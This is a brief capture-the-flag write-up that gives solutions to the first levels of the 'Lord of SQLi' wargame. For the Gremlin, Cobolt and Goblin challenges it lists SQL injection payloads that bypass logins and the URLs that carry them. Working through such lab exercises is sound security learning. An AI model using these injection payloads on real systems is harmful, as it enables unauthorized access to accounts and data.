# Lord of SQLi



## Gremlin
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Gremlinq.png)
Solution:

Using ?id=1&pw=1%27%20or%201%23 would result the query execute.

query : select id from prob_gremlin where id='1' and pw='1' or 1#'

link: https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=1&pw=1%27%20or%201%23

## Cobolt

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Cobolt.png)

query : select id from prob_cobolt where id='' or id='admin' #' and pw=md5('')

link:https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=%27%20or%20id=%27admin%27%20%23

## Goblin

![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Goblin.png)

query : select id from prob_goblin where id='guest' and no=1 or 1 limit 1,1

link: https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=1%20or%201%20limit%201,1#


## orc
![image](https://github.com/keerthiprabup/Webtasks/blob/main/Lordofsqli/images/Orc.png)
